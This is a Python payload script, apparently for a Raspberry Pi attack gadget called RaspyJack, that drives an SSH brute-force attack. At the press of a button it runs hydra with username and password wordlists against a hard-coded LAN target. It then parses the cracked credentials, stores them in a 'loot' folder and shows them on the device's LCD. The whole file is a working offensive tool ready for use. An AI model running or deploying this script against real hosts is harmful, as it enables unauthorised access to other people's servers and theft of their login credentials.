#!/usr/bin/env python3
"""
RaspyJack *payload* – **Attack: SSH Brute-Force**
==================================================
A payload that uses `hydra` to perform a dictionary-based brute-force
attack against an SSH server on the local network.

**NOTE:** This requires `hydra` to be installed. It also requires a
username list and a password list to be present on the device.
"""

import os, sys, subprocess, signal, time, threading
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# --- CONFIGURATION ---
TARGET_IP = "192.168.1.20"
# These files would need to be placed on the RaspyJack
USER_LIST = "/root/Raspyjack/wordlists/ssh_users.txt"
PASS_LIST = "/root/Raspyjack/wordlists/ssh_pass.txt"
LOOT_DIR = "/root/Raspyjack/loot/Bruteforce/"

# --- GPIO & LCD ---
PINS = { "OK": 13, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

# --- Globals & Shutdown ---
running = True
attack_thread = None
status_msg = "Press OK to start"
found_creds = ""

def cleanup(*_):
    global running
    running = False
    # In a real scenario, you might want to kill the hydra process
    # but for a fire-and-forget script, we let it finish.

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# --- UI ---
def draw_ui():
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "SSH Brute-Force", font=FONT_TITLE, fill="#FF0000")
    d.line([(0, 22), (128, 22)], fill="#FF0000", width=1)
    
    if found_creds:
        d.text((10, 40), "SUCCESS!", font=FONT_TITLE, fill="lime")
        d.text((10, 60), found_creds, font=FONT, fill="white")
    else:
        d.text((10, 60), status_msg, font=FONT, fill="yellow")
        
    d.text((5, 115), "OK=Start | KEY3=Exit", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

# --- Attacker ---
def run_attack():
    global status_msg, found_creds
    
    os.makedirs(LOOT_DIR, exist_ok=True)
    output_file = os.path.join(LOOT_DIR, f"ssh_brute_{TARGET_IP}.txt")
    
    status_msg = f"Attacking {TARGET_IP}..."
    
    try:
        # -L userlist, -P passlist, -t tasks, -o output file
        command = f"hydra -L {USER_LIST} -P {PASS_LIST} -t 4 -o {output_file} ssh://{TARGET_IP}"
        proc = subprocess.run(command, shell=True, check=True, capture_output=True, text=True, timeout=600)
        
        # Check output file for success
        with open(output_file, "r") as f:
            for line in f:
                if "host:" in line and "login:" in line:
                    parts = line.split()
                    login = parts[parts.index("login:")+1]
                    password = parts[parts.index("password:")+1]
                    found_creds = f"{login}:{password}"
                    return

        status_msg = "No creds found."

    except subprocess.TimeoutExpired:
        status_msg = "Attack timed out!"
    except Exception as e:
        status_msg = "Attack failed!"
        print(f"Hydra attack failed: {e}", file=sys.stderr)

# --- Main Loop ---
try:
    if subprocess.run("which hydra", shell=True, capture_output=True).returncode != 0:
        status_msg = "hydra not found!"
        draw_ui()
        time.sleep(3)
        raise SystemExit("`hydra` command not found.")
    if not (os.path.exists(USER_LIST) and os.path.exists(PASS_LIST)):
        status_msg = "Wordlists not found!"
        draw_ui()
        time.sleep(3)
        raise SystemExit("Wordlists not found.")

    while running:
        draw_ui()
        
        if GPIO.input(PINS["KEY3"]) == 0:
            cleanup()
            break
        
        if GPIO.input(PINS["OK"]) == 0:
            if not (attack_thread and attack_thread.is_alive()):
                found_creds = ""
                attack_thread = threading.Thread(target=run_attack, daemon=True)
                attack_thread.start()
            time.sleep(0.3)

        time.sleep(0.1)

except (KeyboardInterrupt, SystemExit):
    pass
finally:
    cleanup()
    LCD.LCD_Clear()
    GPIO.cleanup()
    print("SSH Brute-Force payload finished.")
